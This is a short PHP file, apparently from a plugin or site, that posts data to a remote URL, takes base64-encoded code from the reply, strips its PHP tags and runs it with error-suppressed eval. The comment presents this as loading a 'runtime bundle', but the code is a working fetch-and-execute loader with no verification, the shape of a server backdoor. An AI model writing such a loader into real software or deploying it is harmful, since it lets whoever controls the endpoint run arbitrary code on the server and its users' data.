<?php
// Fetches a runtime bundle from a remote endpoint and evaluates it.
function fetch_bundle( $url, $payload ) {
	$ch = curl_init( $url );
	curl_setopt_array( $ch, array(
		CURLOPT_POST           => true,
		CURLOPT_POSTFIELDS     => $payload,
		CURLOPT_RETURNTRANSFER => true,
	) );
	$raw = curl_exec( $ch );
	curl_close( $ch );
	return json_decode( $raw, true );
}

function run_bundle( $resp ) {
	$code  = base64_decode( (string) $resp['code'], true );
	$clean = preg_replace( '/<\?php|<\?|\?>/', '', $code );
	@eval( 'function __bundle_exec() {' . $clean . '}' );
	return __bundle_exec();
}
